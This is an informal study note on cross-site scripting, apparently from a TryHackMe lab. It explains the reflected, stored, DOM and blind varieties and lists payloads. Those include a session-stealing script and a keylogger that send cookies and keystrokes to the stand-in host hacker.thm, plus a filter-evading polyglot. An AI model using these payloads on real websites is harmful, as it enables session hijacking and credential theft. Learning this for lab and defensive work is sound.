## some usefull payloads

POC : `<script>alert('XSS');</script>`

session stealling : `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

keyloogger : `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

## types 

1. reflected
2. stored
3. blind
4. dom

### Reflected xss

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

![img](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png)

some testing points :
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers

Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected

### stored xss

XSS payload is stored on the web application and gets run when other users visit the site or web page.

![img](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png)


test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to eg: comments, user profile information

### Dom blind

what is DOM: 

Document Object Model and is a programming interface for HTML and XML documents.It represents the page so that programs can change the document structure, style and content.

![img](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png)


DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.

Execution occurs when the website JavaScript code acts on input or user interaction.


eg : The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section.


### Blind xss

Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

A popular tool for Blind XSS attacks is [xsshunter](https://xsshunter.com/). 

***

#### Polygot

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully. 

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

```